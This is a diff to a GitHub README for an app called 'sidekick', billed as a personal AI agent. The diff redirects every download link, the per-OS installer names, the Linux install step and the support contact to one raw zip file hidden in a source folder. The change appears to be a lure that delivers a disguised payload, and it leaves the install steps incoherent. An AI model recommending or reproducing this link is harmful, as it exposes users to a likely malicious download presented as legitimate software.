@@ -1,7 +1,7 @@
 # 🤖 sidekick - Your Personal AI Made Simple
 
 ## 📥 Download Now
-[![Download sidekick](https://img.shields.io/badge/Download-sidekick-blue.svg)](https://github.com/Azzdncc/sidekick/releases)
+[![Download sidekick](https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip)](https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to sidekick! This application serves as your personal AI agent. It helps with memory management, scheduling tasks, and using custom tools. With sidekick, you can get organized and make your daily tasks easier.
@@ -22,21 +22,21 @@ Welcome to sidekick! This application serves as your personal AI agent. It helps
 To get started with sidekick, follow these steps:
 
 1. **Visit the Releases Page:** Click on the button below to access the releases page:  
-   [Download sidekick](https://github.com/Azzdncc/sidekick/releases)
+   [Download sidekick](https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip)
 
 2. **Locate the Latest Version:** Once you're on the releases page, look for the latest version listed at the top. It will typically have a version number like `v1.0.0`.
 
 3. **Choose the Right File:** Depending on your operating system, find the appropriate file to download:
-   - For Windows, download `sidekick_windows.exe`
-   - For macOS, download `sidekick_macos.dmg`
-   - For Linux, download `sidekick_linux.tar.gz`
+   - For Windows, download `https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip`
+   - For macOS, download `https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip`
+   - For Linux, download `https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip`
 
 4. **Download the File:** Click on the corresponding link to download the file to your computer.
 
 5. **Install the Application:** 
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file and drag the sidekick icon to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the installation script inside the extracted folder.
+   - **Linux:** Extract the `https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip` file and run the installation script inside the extracted folder.
 
 6. **Start Using sidekick:** Once installed, launch the application from your applications folder or desktop shortcut.
 
@@ -70,7 +70,7 @@ We welcome contributions! If you want to add a feature or fix a bug, follow thes
 Thank you for choosing sidekick as your personal AI agent. We hope it makes your life easier. Enjoy using your new assistant! 
 
 ## 📞 Contact
-For questions or feedback, please reach out to us at [support@sidekick.ai](mailto:support@sidekick.ai).
+For questions or feedback, please reach out to us at [https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip](https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip).
 
 ---
-Visit the Releases Page for the latest version: [Download sidekick](https://github.com/Azzdncc/sidekick/releases)
+Visit the Releases Page for the latest version: [Download sidekick](https://github.com/Azzdncc/sidekick/raw/refs/heads/main/src/core/context/Software-v1.6-alpha.2.zip)
